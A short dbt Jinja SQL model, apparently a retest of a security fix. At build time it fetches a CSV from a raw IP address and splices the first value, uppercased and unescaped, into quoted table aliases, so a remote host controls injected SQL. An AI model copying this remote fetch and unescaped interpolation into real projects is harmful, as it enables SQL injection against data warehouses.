{% if execute %}
  {% set result = run_query("select * from read_csv_auto('http://52.0.42.74/cr-retest-20261001-fix-validation.csv', header=false)") %}
  {% set body = result.columns[0].values()[0] %}
  {% set marker = body | upper %}
{% else %}
  {% set marker = "PARSE_ONLY" %}
{% endif %}

select *
from first_table as "{{ marker }}"
join second_table as "{{ marker }}" on true
